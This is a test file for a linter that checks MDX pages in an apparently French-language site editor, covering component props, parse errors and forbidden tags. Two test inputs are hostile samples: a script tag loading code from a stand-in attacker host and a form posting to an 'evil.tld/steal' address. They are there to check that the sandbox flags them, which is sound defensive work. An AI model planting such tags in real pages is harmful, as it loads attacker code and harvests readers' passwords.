import { describe, expect, it } from "vitest";
import type { ComponentBuilderSpec } from "./component-descriptors";
import { lintPageSource } from "./page-lint";

// The registry as the directory sees it: Menu is registered but has no .yaml,
// which is exactly the case whose props cannot be checked.
const REGISTRY = ["Image", "Button", "Menu"];

const BUILDERS = [
  {
    base: "image",
    name: "Image",
    defaults: {},
    descriptor: {
      label: "Image",
      properties: {
        file: { label: "Fichier", type: "file-list", required: true },
        alt: { label: "Texte alternatif", type: "text" },
        width: { label: "Largeur", type: "number" },
        whiteBorder: { label: "Bord blanc", type: "checkbox", default: false },
        align: {
          label: "Position",
          type: "list",
          default: "none",
          options: { none: "Aucune", left: "Gauche", center: "Centre" },
        },
        effects: { label: "Effets", type: "divider" },
      },
    },
  },
] as unknown as ComponentBuilderSpec[];

const lint = (source: string) => lintPageSource(source, REGISTRY, BUILDERS);
const messages = (source: string) => lint(source).map((w) => w.message);

describe("a page that holds up raises nothing", () => {
  it("accepts a well-formed component", () => {
    expect(lint('<Image file="a.png" width={400} align="left" />')).toEqual([]);
  });

  it("accepts plain markdown and html", () => {
    expect(lint("# Titre\n\nDu **gras**, un [lien](/page).\n")).toEqual([]);
  });

  it("stays silent on a registered component without a descriptor", () => {
    expect(lint("<Menu quoi=\"bidule\">\n- [A](/a)\n</Menu>")).toEqual([]);
  });
});

describe("a tag the sandbox refuses", () => {
  it("flags a script, the plainest vector there was", () => {
    expect(messages('<script src="https://evil.tld/x.js" />')[0]).toContain(
      "« <script> » n'est pas autorisée"
    );
  });

  it("flags a form, which would prompt a reader for their password", () => {
    expect(messages('<form action="https://evil.tld/steal" />')[0]).toContain(
      "« <form> » n'est pas autorisée"
    );
  });

  it("stays silent on a pasted embed snippet", () => {
    // iframe is in the list on purpose: embedding is pasted, not typed.
    expect(
      lint('<iframe src="https://www.youtube.com/embed/x" allowfullscreen />')
    ).toEqual([]);
  });

  it("stays silent on the tags that mark up prose", () => {
    expect(lint("<div><p>Un <strong>mot</strong>.</p></div>")).toEqual([]);
  });

  it("stays silent on markdown, which never takes the JSX path", () => {
    expect(lint("| a | b |\n|---|---|\n| 1 | 2 |\n\n- [ ] à faire\n")).toEqual(
      []
    );
  });
});

describe("what would silently do nothing", () => {
  it("flags an unknown component", () => {
    expect(messages('<Buton text="Salut" />')[0]).toContain(
      "« Buton » n'existe pas"
    );
  });

  it("flags a missing required prop", () => {
    expect(messages("<Image />")[0]).toContain("« file » est obligatoire");
  });

  it("flags an unknown prop", () => {
    expect(messages('<Image file="a.png" foo="bar" />')[0]).toContain(
      "n'a pas de propriété « foo »"
    );
  });

  it("flags a value outside the declared options", () => {
    expect(messages('<Image file="a.png" align="middle" />')[0]).toContain(
      "n'accepte pas la valeur « middle »"
    );
  });

  it("flags a non-literal expression, as the sandbox drops it", () => {
    expect(messages('<Image file="a.png" width={someVar} />')[0]).toContain(
      "expression à évaluer"
    );
  });

  it("flags a spread", () => {
    expect(messages('<Image file="a.png" {...props} />')[0]).toContain(
      "étalées"
    );
  });

  it("does not mistake a literal expression for an evaluable one", () => {
    expect(messages('<Image file="a.png" width={400} />')).toEqual([]);
  });

  it("reports the line, so the author can find it", () => {
    expect(lint('# Titre\n\ntexte\n\n<Buton />')[0].line).toBe(5);
  });

  it("treats a divider as no prop at all", () => {
    // A divider is builder chrome, never a prop the component accepts.
    expect(messages('<Image file="a.png" effects="oui" />')[0]).toContain(
      "n'a pas de propriété « effects »"
    );
  });
});

// One rule for every prop: will the value do what the author wrote? The test
// is usability, not type identity — each expectation below was checked against
// the real render before being written down.
describe("a value the prop cannot use", () => {
  it("flags a non-numeric string on a number prop", () => {
    expect(messages('<Image file="a.png" width="abc" />')[0]).toContain(
      "attend un nombre"
    );
  });

  // Renders correctly today, and is still wrong: `type: number` promises the
  // component a number, <Image> merely survives a string. The builder is the
  // contract in code and shows this field *empty*, so the tag and the tool
  // already disagree.
  it("flags a numeric string on a number prop", () => {
    expect(messages('<Image file="a.png" width="200" />')[0]).toContain(
      "attend un nombre entre accolades"
    );
  });

  it("flags a bare attribute on a number prop, which means {true}", () => {
    expect(messages('<Image file="a.png" width />')[0]).toContain(
      "attend un nombre"
    );
  });

  it("flags a string on a checkbox", () => {
    // Verified: whiteBorder="false" turns the border ON — every non-empty
    // string is truthy, so this does the opposite of what is written.
    expect(messages('<Image file="a.png" whiteBorder="false" />')[0]).toContain(
      "attend {true} ou {false}"
    );
  });

  it("flags a bare attribute on a text prop: it renders nothing", () => {
    expect(messages('<Image file="a.png" alt />')[0]).toContain(
      "attend du texte"
    );
  });
});

describe("a value the prop can use, which must stay silent", () => {
  it("accepts a number literal on a number prop", () => {
    expect(lint('<Image file="a.png" width={400} />')).toEqual([]);
  });

  it("accepts a number on a text prop: it reads back as its text", () => {
    expect(lint('<Image file="a.png" alt={42} />')).toEqual([]);
  });

  it("accepts both booleans on a checkbox", () => {
    expect(lint('<Image file="a.png" whiteBorder={true} />')).toEqual([]);
    expect(lint('<Image file="a.png" whiteBorder={false} />')).toEqual([]);
    // The JSX shorthand: a bare attribute is `true`.
    expect(lint('<Image file="a.png" whiteBorder />')).toEqual([]);
  });
});

describe("MDX that does not even parse", () => {
  // Saving must never become impossible: the author owns the page, broken or
  // not. Throwing here would reject the action behind the save button.
  const BROKEN = [
    '<Image width= />',
    '<Image file="a.png"',
    '<Image width=400 />',
    "texte { cassé",
  ];

  it.each(BROKEN)("reports %j instead of throwing", (source) => {
    const found = lint(source);
    expect(found).toHaveLength(1);
    expect(found[0].message).toContain("erreur de compilation");
    // The compiler's own words go to `details`, never inlined into the prose.
    expect(found[0].details).toBeTruthy();
  });

  it("points at the line it broke on", () => {
    expect(lint("# Titre\n\ntexte\n\n<Image width= />")[0].line).toBe(5);
  });
});

describe("what must never be flagged", () => {
  it("ignores JSX inside a code fence", () => {
    expect(lint('```mdx\n<Buton text="exemple" />\n```\n')).toEqual([]);
  });

  it("ignores a link to a page that does not exist yet", () => {
    // ADR 0006: a dangling wiki link is an invitation to create, not an error.
    expect(lint("Voir [cette page](/pas-encore-creee).")).toEqual([]);
  });
});
